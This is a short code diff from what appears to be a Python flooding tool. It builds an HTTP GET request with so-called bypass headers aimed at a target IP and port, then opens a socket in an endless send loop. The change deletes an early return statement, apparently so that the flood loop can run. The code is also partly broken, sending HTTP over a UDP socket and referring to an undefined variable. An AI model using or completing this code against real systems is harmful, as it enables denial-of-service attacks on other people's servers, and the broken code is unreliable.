@@ -82,7 +82,6 @@ def start():
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
     bypass_inject = sockpeler + reffer + userAdmin + content + target_host + length + "\r\n"
-    return subjection
     while True:
           try:
              s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
